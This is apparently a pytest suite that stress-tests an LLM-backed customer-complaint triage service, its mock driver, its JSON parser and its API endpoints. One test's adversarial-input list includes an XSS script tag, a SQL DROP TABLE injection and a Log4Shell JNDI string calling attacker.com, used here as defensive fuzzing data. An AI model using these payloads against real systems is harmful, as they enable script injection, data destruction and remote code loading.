"""
Empirical Adversarial Stress Suite for Local LLM Triage and Mock Driver Fallback.
Requirement R1 and R2 verification under extreme, adversarial, and boundary conditions.
"""

import asyncio
import concurrent.futures
import json
import string
import time
import pytest
from typing import Dict, Any, List, Mapping

from app.triage import (
    triage_complaint,
    predict_category,
    async_triage_complaint,
    async_predict_category,
    CategoryResult,
    ALL_11_CATEGORIES,
    CATEGORY_TO_TEAM,
    SLA_DEFAULTS,
    LABEL_MAP,
    CATEGORY_PRECEDENTS,
    TriageEngine,
    cra_engine,
    generate_intelligence_report,
)
from app.providers.base_driver import BaseLlmDriver
from mock_driver import MockDriver
from app.utils.json_extractor import parse_json
from fastapi.testclient import TestClient
from app.main import app


client = TestClient(app)


# ============================================================================
# 1. BOUNDARY CONDITIONS FOR triage_complaint AND predict_category
# ============================================================================

class TestBoundaryConditions:
    """Stress tests for empty, whitespace, punctuation, large, ambiguous, and unicode inputs."""

    def test_empty_string(self):
        """Empty complaint string must return schema-compliant report with 0.0 confidence."""
        report = triage_complaint("")
        assert isinstance(report, dict)
        assert report["predicted_category"] in ALL_11_CATEGORIES
        assert report["category_confidence"] == 0.0
        assert isinstance(report["top_3_categories"], list)
        assert len(report["top_3_categories"]) == 3
        assert "recommended_team" in report
        assert "sla" in report
        assert "predicted_sla_hours" in report
        assert "extracted_entities" in report
        assert "summary" in report
        assert "similar_cases" in report

        # Test predict_category on empty string
        res = predict_category("")
        assert isinstance(res, CategoryResult)
        assert res == "Account Management"
        assert res["category_confidence"] == 0.0

    def test_none_input(self):
        """None input coerced safely to empty triage without crash."""
        report = triage_complaint(None)
        assert isinstance(report, dict)
        assert report["predicted_category"] in ALL_11_CATEGORIES
        assert report["category_confidence"] == 0.0

        res = predict_category(None)
        assert isinstance(res, CategoryResult)
        assert res == "Account Management"
        assert res["category_confidence"] == 0.0

    def test_whitespace_only(self):
        """Whitespace only ('   ', tabs, newlines) must be treated as empty."""
        for ws in ["   ", "\t\t", "\n\r\n", "   \t \n  "]:
            report = triage_complaint(ws)
            assert report["predicted_category"] in ALL_11_CATEGORIES
            assert report["category_confidence"] == 0.0

            res = predict_category(ws)
            assert res == "Account Management"
            assert res["category_confidence"] == 0.0

    def test_punctuation_and_adversarial_symbols(self):
        """Punctuation only and special adversarial strings should not crash."""
        adversarial_inputs = [
            "???!!!",
            "....",
            "!@#$%^&*()_+=-~`{}[]|\\:;\"'<>,.?/",
            "\x00\x01\x02\x03\x04",  # Control characters
            "<script>alert(1)</script>",
            "'; DROP TABLE complaints; --",
            "${jndi:ldap://attacker.com/a}",
        ]
        for adv in adversarial_inputs:
            report = triage_complaint(adv)
            assert isinstance(report, dict)
            assert report["predicted_category"] in ALL_11_CATEGORIES
            assert 0.0 <= report["category_confidence"] <= 1.0
            assert isinstance(report["sla"], dict)
            assert "estimated_hours" in report["sla"]

            res = predict_category(adv)
            assert isinstance(res, CategoryResult)
            assert res in ALL_11_CATEGORIES

    def test_large_input_latency_and_stability(self):
        """
        Complaints of 10KB, 25KB, 50KB, and 100KB.
        Verifies latency < 100ms on fallback without crash or memory leak.
        """
        base_complaint = (
            "I noticed that my account was charged twice for order ORD-81094. "
            "Please reverse the duplicate charge TXN-7712 of $49.00 immediately. "
            "Here is the detailed background log of what happened: "
        )
        sizes = [10_000, 25_000, 50_000, 100_000]

        for sz in sizes:
            filler = "Log line indicating recurring payment attempt at timestamp 2026-10-21. " * (sz // 60)
            large_text = base_complaint + filler
            assert len(large_text) >= sz

            t0 = time.perf_counter()
            report = triage_complaint(large_text)
            elapsed_ms = (time.perf_counter() - t0) * 1000.0

            assert elapsed_ms < 100.0, f"Latency {elapsed_ms:.2f}ms exceeded 100ms threshold for {sz} bytes"
            assert report["predicted_category"] == "Refunds"
            assert report["category_confidence"] >= 0.90
            assert report["extracted_entities"]["order_id"] == "ORD-81094"

            res = predict_category(large_text)
            assert res == "Refunds"

    def test_ambiguous_category_complaints(self):
        """
        Ambiguous complaints mixing keywords from multiple categories.
        Must return a valid category from ALL_11_CATEGORIES, valid SLA, and valid entities.
        """
        scenarios = [
            # 500 error (Bugs & Errors) + billing refund (Refunds/Billing) + order id
            (
                "I got a 500 error while checking my billing refund for order ORD-12345",
                {"ORD-12345"},
            ),
            # Security breach (Security) + 2FA failure (Auth) + refund request (Refunds)
            (
                "Security breach detected! My 2FA SMS code failed and someone requested a refund of $120.00",
                {"$120.00"},
            ),
            # Data sync (Data Sync) + API webhook rate limit 429 (Integrations & API)
            (
                "Our mobile offline sync queue is failing because webhook API rate limit 429 returned gateway timeout",
                set(),
            ),
            # Performance lag (Performance) + downgrade subscription (Subscription)
            (
                "System is too slow and laggy, full-text search takes 40s so I want to downgrade my subscription plan",
                set(),
            ),
            # Onboarding tutorial (Onboarding) + cannot log in (Auth)
            (
                "I am following the getting started how-to guide but cannot log in with my password",
                set(),
            ),
        ]

        for text, expected_tokens in scenarios:
            report = triage_complaint(text)
            assert report["predicted_category"] in ALL_11_CATEGORIES
            assert 0.0 <= report["category_confidence"] <= 1.0
            assert report["recommended_team"] in set(CATEGORY_TO_TEAM.values())
            assert isinstance(report["sla"], dict)
            assert report["sla"]["estimated_hours"] > 0
            assert len(report["top_3_categories"]) == 3

            # Check entity extraction
            if "ORD-12345" in expected_tokens:
                assert report["extracted_entities"]["order_id"] == "ORD-12345"

            res = predict_category(text)
            assert res in ALL_11_CATEGORIES
            assert isinstance(res, str)
            assert isinstance(res, Mapping)

    def test_unicode_and_emoji_handling(self):
        """Non-ASCII, Unicode, Cyrillic, CJK, Arabic, German umlauts, and emojis."""
        test_cases = [
            # Emojis + currency symbols
            "🚨 CRITICAL BUG: Application crashed with 500 error! 💥 Please fix ASAP 📱",
            # Emojis + refund keywords
            "Double charge 💳 ORD-99881 debited twice €99.00! 😡 Need refund please 🙏",
            # Cyrillic
            "Приложение вылетает с ошибкой 500 при экспорте PDF BUG-1234",
            # CJK (Chinese)
            "双重扣费，请退款 订单 ORD-77665 金额 ¥5000",
            # Japanese
            "ログインできません。2FAの確認コードが届かないです AUTH-3321",
            # Arabic
            "تم خصم المبلغ مرتين من حسابي يرجى إعادة المبلغ",
            # German umlauts
            "Rückerstattung für fehlerhafte Überweisung und doppelte Abbuchung für Bestellung ORD-44551 nötig.",
            # French accents
            "Problème d'accès et authentification à deux facteurs bloquée pour USR-99812",
        ]

        for text in test_cases:
            report = triage_complaint(text)
            assert isinstance(report, dict)
            assert report["predicted_category"] in ALL_11_CATEGORIES
            assert 0.0 <= report["category_confidence"] <= 1.0
            assert report["summary"] is not None

            res = predict_category(text)
            assert res in ALL_11_CATEGORIES


# ============================================================================
# 2. DUAL-TYPE SEMANTICS OF CategoryResult
# ============================================================================

class TestDualTypeCategoryResult:
    """Rigorous tests confirming CategoryResult behaves simultaneously as str and Mapping."""

    @pytest.fixture
    def refund_result(self):
        return predict_category("I was charged twice for order ORD-81094")

    def test_string_semantics(self, refund_result):
        """CategoryResult must pass all standard string operations and comparisons."""
        assert isinstance(refund_result, str)
        assert refund_result == "Refunds"
        assert "Refunds" == refund_result
        assert refund_result != "Billing"
        assert refund_result != 123

        # String methods
        assert refund_result.lower() == "refunds"
        assert refund_result.upper() == "REFUNDS"
        assert refund_result.startswith("Ref")
        assert refund_result.endswith("unds")
        assert len(str(refund_result)) == 7
        assert refund_result.split("u") == ["Ref", "nds"]
        assert refund_result.replace("funds", "play") == "Replay"

        # Interpolation and formatting
        assert f"Category: {refund_result}" == "Category: Refunds"
        assert "Category: %s" % refund_result == "Category: Refunds"
        assert str(refund_result) == "Refunds"

        # Containment and hashing
        assert refund_result in ["Refunds", "Billing", "Security"]
        assert hash(refund_result) == hash("Refunds")

    def test_mapping_semantics(self, refund_result):
        """CategoryResult must implement collections.abc.Mapping interface."""
        assert isinstance(refund_result, Mapping)

        # Key indexing
        assert refund_result["predicted_category"] == "Refunds"
        assert isinstance(refund_result["category_confidence"], float)
        assert 0.0 <= refund_result["category_confidence"] <= 1.0
        assert isinstance(refund_result["top_3_categories"], list)
        assert len(refund_result["top_3_categories"]) == 3

        # KeyError on invalid key
        with pytest.raises(KeyError):
            _ = refund_result["nonexistent_key"]

        # Mapping .get()
        assert refund_result.get("predicted_category") == "Refunds"
        assert refund_result.get("missing_key", "default_val") == "default_val"
        assert refund_result.get("missing_key") is None

        # Mapping keys, values, items
        keys = list(refund_result.keys())
        assert set(keys) == {"predicted_category", "category_confidence", "top_3_categories"}

        items = dict(refund_result.items())
        assert items["predicted_category"] == "Refunds"
        assert "category_confidence" in items
        assert "top_3_categories" in items

        # len() and iter()
        assert len(refund_result) == 3
        assert list(iter(refund_result)) == ["predicted_category", "category_confidence", "top_3_categories"]

        # to_dict() method
        d = refund_result.to_dict()
        assert isinstance(d, dict)
        assert d["predicted_category"] == "Refunds"
        assert len(d) == 3

        # dict(CategoryResult) coercion
        d2 = dict(refund_result)
        assert d2["predicted_category"] == "Refunds"
        assert d2["category_confidence"] == refund_result["category_confidence"]

    def test_top_3_structure(self, refund_result):
        """top_3_categories must contain 3 valid categories with descending scores."""
        top_3 = refund_result["top_3_categories"]
        assert len(top_3) == 3
        for entry in top_3:
            assert "category" in entry
            assert "score" in entry
            assert entry["category"] in ALL_11_CATEGORIES
            assert 0.0 <= entry["score"] <= 1.0
        assert top_3[0]["category"] == "Refunds"
        assert top_3[0]["score"] >= top_3[1]["score"]
        assert top_3[1]["score"] >= top_3[2]["score"]


# ============================================================================
# 3. EVENT-LOOP CONCURRENCY AND SAFETY
# ============================================================================

class TestEventLoopSafetyAndConcurrency:
    """Verifies triage_complaint and predict_category execution across threading and async contexts."""

    def test_sync_code_execution(self):
        """Calling from normal synchronous code."""
        report = triage_complaint("I was billed twice for ORD-88219")
        assert report["predicted_category"] == "Refunds"

        cat = predict_category("I was billed twice for ORD-88219")
        assert cat == "Refunds"

    def test_worker_threads_concurrency(self):
        """Calling from multiple worker threads in parallel via ThreadPoolExecutor."""
        complaints = [
            "Charged twice for ORD-81094",
            "App crash with 500 error BUG-4401",
            "2FA SMS code not arriving AUTH-9921",
            "Webhook 429 rate limit exceeded API-HOOK-7703",
            "Data sync divergence SYNC-RECON-2201",
            "Search queries slow latency PERF-OPT-3301",
            "Unauthorized login detected SEC-REVOKE-8812",
            "Downgrade to Starter tier SUB-ADJ-6601",
            "VAT tax invoice request INV-85420-VAT",
            "How do I invite team members GUIDE-ONB-1102",
        ]

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(triage_complaint, c) for c in complaints]
            results = [f.result(timeout=5.0) for f in futures]

        assert len(results) == len(complaints)
        for r in results:
            assert r["predicted_category"] in ALL_11_CATEGORIES
            assert r["category_confidence"] > 0.80

    def test_inside_already_running_asyncio_event_loop(self):
        """
        Calling SYNCHRONOUS triage_complaint and predict_category from INSIDE a running asyncio loop.
        Must not trigger 'RuntimeError: This event loop is already running'.
        """
        async def run_inside_loop():
            # Calling synchronous triage_complaint from async function
            r1 = triage_complaint("Charged twice for ORD-81094")
            c1 = predict_category("Charged twice for ORD-81094")

            # Concurrent synchronous calls from inside running loop
            loop = asyncio.get_running_loop()
            tasks = [
                loop.run_in_executor(None, triage_complaint, "500 error in app"),
                loop.run_in_executor(None, predict_category, "2FA authentication failed"),
            ]
            r2, c2 = await asyncio.gather(*tasks)
            return r1, c1, r2, c2

        r1, c1, r2, c2 = asyncio.run(run_inside_loop())
        assert r1["predicted_category"] == "Refunds"
        assert c1 == "Refunds"
        assert r2["predicted_category"] == "Bugs & Errors"
        assert c2 == "Authentication & Access"

    def test_native_async_methods(self):
        """Calling native async_triage_complaint and async_predict_category."""
        async def run_async():
            tasks = [
                async_triage_complaint("Charged twice for ORD-81094"),
                async_predict_category("App crash 500 error"),
                async_triage_complaint("Two-factor auth locked out"),
            ]
            return await asyncio.gather(*tasks)

        res = asyncio.run(run_async())
        assert res[0]["predicted_category"] == "Refunds"
        assert res[1] == "Bugs & Errors"
        assert res[2]["predicted_category"] == "Authentication & Access"


# ============================================================================
# 4. MOCKDRIVER FALLBACK ROBUSTNESS AND SCHEMA FOR ALL 11 CATEGORIES
# ============================================================================

class TestMockDriverFallbackRobustness:
    """Verifies schema validity for all 11 categories and unhandled exception safety of parse_json."""

    ALL_11_TEST_PROMPTS = {
        "Refunds": "Customer billed twice for order ORD-81094, requesting immediate refund",
        "Authentication & Access": "Cannot log in, two-factor authentication 2FA SMS code not received, account locked out",
        "Bugs & Errors": "Mobile app crashes with HTTP 500 internal server error during PDF export",
        "Integrations & API": "Webhook dead-lettered with HTTP 504 gateway timeout and 429 burst rate limit",
        "Data Sync": "Data sync divergence detected between mobile offline queue and cloud database",
        "Performance": "Search queries slow with high latency, taking 45 seconds to load dashboard charts",
        "Security": "Suspicious unauthorized login detected from unknown IP, potential security breach",
        "Subscription": "Requesting plan downgrade to Starter tier and prorated renewal billing credit",
        "Billing": "Need formal German VAT tax invoice and stamped receipt for European VIES compliance",
        "Onboarding & How-To": "How do I invite team members and configure workspace roles using the tutorial guide?",
        "Account Management": "Requesting enterprise workspace consolidation and organization ownership transfer",
    }

    REQUIRED_TOP_LEVEL_KEYS = [
        "predicted_category",
        "category_confidence",
        "top_3_categories",
        "recommended_team",
        "team_confidence",
        "team_method",
        "sla",
        "predicted_sla_hours",
        "extracted_entities",
        "summary",
        "similar_cases",
    ]

    REQUIRED_SLA_KEYS = ["estimated_hours", "sla_target_hours", "sla_risk", "priority"]
    REQUIRED_ENTITY_KEYS = ["references", "dates", "amounts", "products", "order_id", "transaction_id", "customer_id"]

    def test_all_11_categories_schema_compliance(self):
        """Verify that MockDriver outputs valid JSON satisfying the complete schema for each category."""
        mock = MockDriver()

        for expected_category, prompt_content in self.ALL_11_TEST_PROMPTS.items():
            messages = [
                {
                    "role": "system",
                    "content": "You are an expert customer complaint triage agent. Choose predicted_category from EXACTLY these 11 standard CRA categories.",
                },
                {"role": "user", "content": prompt_content},
            ]
            raw_response = mock._determine_response(messages)
            assert raw_response is not None, f"Mock returned None for category {expected_category}"

            # Must parse cleanly
            data = parse_json(raw_response)
            assert isinstance(data, dict), f"Failed to parse JSON for category {expected_category}: {raw_response[:100]}"

            # Verify top-level keys
            for key in self.REQUIRED_TOP_LEVEL_KEYS:
                assert key in data, f"Missing key '{key}' in mock response for {expected_category}"

            # Category check
            assert data["predicted_category"] == expected_category, (
                f"Expected {expected_category}, got {data['predicted_category']}"
            )
            assert data["predicted_category"] in ALL_11_CATEGORIES

            # Confidence check
            conf = data["category_confidence"]
            assert isinstance(conf, float)
            assert 0.0 <= conf <= 1.0

            # SLA check
            sla = data["sla"]
            assert isinstance(sla, dict)
            for k in self.REQUIRED_SLA_KEYS:
                assert k in sla
            assert isinstance(sla["estimated_hours"], (int, float))
            assert sla["estimated_hours"] > 0
            assert data["predicted_sla_hours"] == sla["estimated_hours"]

            # Extracted entities check
            entities = data["extracted_entities"]
            assert isinstance(entities, dict)
            for k in self.REQUIRED_ENTITY_KEYS:
                assert k in entities
            assert isinstance(entities["references"], list)
            assert isinstance(entities["dates"], list)
            assert isinstance(entities["amounts"], list)
            assert isinstance(entities["products"], list)

            # Summary check
            assert isinstance(data["summary"], str)
            assert len(data["summary"]) > 10

            # Similar cases check
            similar = data["similar_cases"]
            assert isinstance(similar, list)
            assert len(similar) >= 1
            for case in similar:
                assert "ticket_id" in case
                assert "description" in case
                assert "resolution" in case
                assert "assigned_team" in case
                assert "resolution_time_hours" in case
                assert "similarity" in case

    def test_parse_json_adversarial_inputs_never_raise(self):
        """Fuzz parse_json with malicious, truncated, non-string, and malformed inputs."""
        malicious_inputs = [
            None,
            "",
            "   ",
            123,
            45.67,
            True,
            False,
            [],
            {},
            object(),
            b"raw bytes",
            "Not JSON at all",
            "{unquoted_key: 'value'}",
            "{'single_quoted': 'value'}",
            '{"unclosed": "brace"',
            '{"trailing_comma": "value",}',
            '{"nested": {"broken": ]}}',
            '{"deep": ' + ('{"level": ' * 50) + '"bottom"' + ('}' * 50),
            '{"null_byte": "\x00\x01\x02"}',
            '<thought>thinking about JSON</thought>```json\n{"valid": true}\n```',
            '<thought>malformed thought tag<thought>```{"key": 1}```',
            '{"truncated_array": [1, 2, 3, ',
            'Text before {"key": "value"} and text after',
            'Multiple objects {"first": 1} {"second": 2}',
            '[' * 1000,
            '}' * 1000,
            'A' * 100_000,  # 100KB random string
        ]

        for item in malicious_inputs:
            try:
                result = parse_json(item)
                # Result must be either a parsed dict/list or None, but NEVER raise an exception
                assert result is None or isinstance(result, (dict, list)), (
                    f"parse_json returned invalid type {type(result)} for input {repr(item)[:50]}"
                )
            except Exception as exc:
                pytest.fail(f"parse_json raised unhandled exception {type(exc).__name__}: {exc} for input: {repr(item)[:50]}")


# ============================================================================
# 5. ADVERSARIAL DRIVER INJECTION & FALLBACK FAIL-SAFE
# ============================================================================

class TestAdversarialDriverInjection:
    """Verifies triage resilience when custom LLM drivers fail, crash, or return bad data."""

    class ExplodingDriver(BaseLlmDriver):
        async def complete(self, messages, **kwargs):
            raise ConnectionResetError("LM Studio server crashed ungracefully")

        async def stream(self, messages, **kwargs):
            raise ConnectionResetError("LM Studio streaming crash")

        async def fetch_models(self, **kwargs):
            return {"ok": False}

    class NonJsonDriver(BaseLlmDriver):
        async def complete(self, messages, **kwargs):
            return "I am a helpful assistant but I will not generate any JSON for you."

        async def stream(self, messages, **kwargs):
            return "No JSON output"

        async def fetch_models(self, **kwargs):
            return {"ok": True, "models": []}

    class MarkdownWrappedDriver(BaseLlmDriver):
        async def complete(self, messages, **kwargs):
            return """Here is your assessment:
```json
{
  "predicted_category": "Billing",
  "category_confidence": 0.88,
  "top_3_categories": [
    {"category": "Billing", "score": 0.88},
    {"category": "Refunds", "score": 0.08},
    {"category": "Subscription", "score": 0.04}
  ],
  "recommended_team": "Billing",
  "summary": "Customer needs tax receipt."
}
```
Please let me know if you need anything else!"""

        async def stream(self, messages, **kwargs):
            return ""

        async def fetch_models(self, **kwargs):
            return {"ok": True, "models": []}

    def test_exploding_driver_falls_back_gracefully(self):
        """When the LLM driver raises an exception, triage must fall back deterministically."""
        exploding = self.ExplodingDriver("exploding")
        report = triage_complaint("Charged twice for ORD-81094", driver=exploding)
        assert isinstance(report, dict)
        assert report["predicted_category"] == "Refunds"
        assert report["category_confidence"] >= 0.90

        cat = predict_category("Charged twice for ORD-81094", driver=exploding)
        assert cat == "Refunds"

    def test_non_json_driver_falls_back_gracefully(self):
        """When LLM returns plain prose with no JSON, triage falls back deterministically."""
        non_json = self.NonJsonDriver("non_json")
        report = triage_complaint("Charged twice for ORD-81094", driver=non_json)
        assert isinstance(report, dict)
        assert report["predicted_category"] == "Refunds"

    def test_markdown_wrapped_driver_parsed_correctly(self):
        """When LLM wraps JSON in markdown fences and greeting text, it parses cleanly."""
        markdown_driver = self.MarkdownWrappedDriver("markdown")
        report = triage_complaint("Need German VAT receipt", driver=markdown_driver)
        assert isinstance(report, dict)
        assert report["predicted_category"] == "Billing"
        assert report["category_confidence"] == 0.88


# ============================================================================
# 6. FASTAPI ENDPOINT ADVERSARIAL STRESS (/api/cra/triage & /api/cra/predict)
# ============================================================================

class TestApiEndpointsStress:
    """Stress-test REST API endpoints with boundary and adversarial payloads."""

    def test_api_cra_triage_empty_body(self):
        """Empty request body to /api/cra/triage returns 400."""
        res = client.post("/api/cra/triage", json={})
        assert res.status_code == 400
        data = res.json()
        assert data["ok"] is False
        assert "error" in data

    def test_api_cra_triage_valid_complaint(self):
        """Valid complaint to /api/cra/triage returns 200 with schema-compliant report."""
        res = client.post("/api/cra/triage", json={"complaint": "I was charged twice for ORD-81094"})
        assert res.status_code == 200
        data = res.json()
        assert data["ok"] is True
        report = data["report"]
        assert report["predicted_category"] == "Refunds"
        assert report["category_confidence"] >= 0.90
        assert report["sla"]["estimated_hours"] > 0
        assert report["extracted_entities"]["order_id"] == "ORD-81094"

    def test_api_cra_predict_empty_body(self):
        """Empty request body to /api/cra/predict returns 400."""
        res = client.post("/api/cra/predict", json={})
        assert res.status_code == 400
        data = res.json()
        assert data["ok"] is False

    def test_api_cra_predict_valid_complaint(self):
        """Valid complaint to /api/cra/predict returns 200 with category result."""
        res = client.post("/api/cra/predict", json={"query": "Application crashes with 500 error"})
        assert res.status_code == 200
        data = res.json()
        assert data["ok"] is True
        assert data["predicted_category"] == "Bugs & Errors"
        assert "category_confidence" in data
        assert "top_3_categories" in data

    def test_api_cra_resolve_and_classify_aliases(self):
        """Legacy route aliases /api/cra/resolve and /api/cra/classify remain functional."""
        res_triage = client.post("/api/cra/resolve", json={"complaint": "2FA code failed"})
        assert res_triage.status_code == 200
        assert res_triage.json()["report"]["predicted_category"] == "Authentication & Access"

        res_predict = client.post("/api/cra/classify", json={"complaint": "2FA code failed"})
        assert res_predict.status_code == 200
        assert res_predict.json()["predicted_category"] == "Authentication & Access"


# ============================================================================
# 7. BACKWARD COMPATIBILITY EXPORTS & ENGINE INTEGRITY
# ============================================================================

class TestBackwardCompatibility:
    """Verifies that all exports from legacy triage remain available and functional."""

    def test_legacy_exports(self):
        assert len(ALL_11_CATEGORIES) == 11
        assert len(LABEL_MAP) == 11
        assert len(CATEGORY_TO_TEAM) == 11
        assert len(SLA_DEFAULTS) == 11
        assert len(CATEGORY_PRECEDENTS) == 11

        # TriageEngine class and cra_engine singleton
        assert isinstance(cra_engine, TriageEngine)
        res = cra_engine.predict_category("Charged twice for ORD-81094")
        assert res == "Refunds"

        rep = cra_engine.generate_intelligence_report("Charged twice for ORD-81094")
        assert rep["predicted_category"] == "Refunds"

        # Alias function
        assert generate_intelligence_report is triage_complaint


# ============================================================================
# 8. LATENCY AND THROUGHPUT PERFORMANCE EMPIRICAL BENCHMARK
# ============================================================================

class TestPerformanceBenchmark:
    """Measures latency and throughput of triage under offline mock fallback."""

    def test_single_call_latency_sub_10ms(self):
        """Single fallback triage call must execute in < 10ms (well within the 100ms requirement)."""
        # Warmup
        _ = triage_complaint("Warmup call")

        t0 = time.perf_counter()
        _ = triage_complaint("Customer reported double charge for order ORD-81094")
        latency_ms = (time.perf_counter() - t0) * 1000.0

        assert latency_ms < 100.0, f"Latency {latency_ms:.2f}ms exceeded 100ms threshold"

    def test_burst_throughput_100_calls(self):
        """100 sequential triage calls must execute in under 1.0s (> 100 req/sec)."""
        complaint = "Mobile application crashes with 500 error when clicking PDF export"
        t0 = time.perf_counter()
        for _ in range(100):
            res = predict_category(complaint)
            assert res == "Bugs & Errors"
        total_sec = time.perf_counter() - t0

        assert total_sec < 1.0, f"100 calls took {total_sec:.2f}s, expected < 1.0s"
